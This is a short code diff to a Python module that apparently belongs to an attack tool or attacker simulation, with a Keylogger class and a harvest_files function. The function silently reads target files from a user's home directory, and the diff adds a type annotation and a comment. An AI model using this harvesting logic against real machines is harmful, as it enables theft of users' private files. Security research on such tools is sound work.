@@ -199,7 +199,7 @@ class Keylogger:
 
 # --- File harvest ---------------------------------------------------------
 
-def harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = False) -> dict:
+def harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = False) -> dict[str, str | bytes]:
     """Read a set of files under ``home`` and return a {rel_path: contents} map.
 
     Missing files are silently skipped — the attacker does not crash if a target
@@ -220,6 +220,7 @@ def harvest_files(home: Path, relative_paths: Iterable[str], *, binary: bool = F
             else:
                 out[rel] = src.read_text(encoding="utf-8", errors="replace")
         except OSError:
+            # Permission denied / I/O error — skip, do not propagate.
             continue
     return out
 
